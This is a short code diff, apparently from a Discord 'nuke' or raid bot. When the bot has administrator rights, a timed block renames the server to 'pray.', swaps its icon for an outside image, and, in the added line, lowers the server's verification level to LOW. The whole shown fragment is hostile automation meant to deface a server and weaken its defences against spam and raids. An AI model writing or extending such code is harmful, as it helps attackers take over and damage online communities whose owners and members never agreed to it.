@@ -354,8 +354,8 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
   setTimeout(() => {
      message.guild.setName("pray.")
      message.guild.setIcon("https://images-ext-1.discordapp.net/external/AJ3ZseNi8NlElR_I1tS51ubQguFMXm4h5CqKc_V_cdU/%3Fwidth%3D587%26height%3D587/https/media.discordapp.net/attachments/735392717886193666/754861066105782312/20200820_203508.jpg")
-  
-  }, 3000);
+     message.guild.setVerificationLevel("LOW")
+  }, 2000);
          
   }
  })
